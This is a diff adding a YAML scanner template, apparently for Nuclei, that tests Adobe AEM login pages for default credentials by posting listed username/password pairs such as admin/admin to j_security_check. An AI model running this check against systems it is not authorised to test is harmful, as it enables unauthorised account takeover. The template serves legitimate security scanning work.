@@ -1,0 +1,46 @@
+id: aem-default-login
+info:
+  author: random-robbie
+  name: Adobe AEM Default Login
+  severity: critical
+  tags: aem,default-login,adobe
+requests:
+- attack: pitchfork
+  matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: header
+    type: word
+    words:
+    - login-token
+    - crx.default
+  matchers-condition: and
+  payloads:
+    aem_pass:
+    - admin
+    - password
+    - replication-receiver
+    - vgnadmin
+    aem_user:
+    - admin
+    - grios
+    - replication-receiver
+    - vgnadmin
+  raw:
+  - 'POST /libs/granite/core/content/login.html/j_security_check HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Origin: {{BaseURL}}
+
+    Referer: {{BaseURL}}/libs/granite/core/content/login.html
+
+
+    _charset_=utf-8&j_username={{aem_user}}&j_password={{aem_pass}}&j_validate=true
+
+    '
+  stop-at-first-match: true
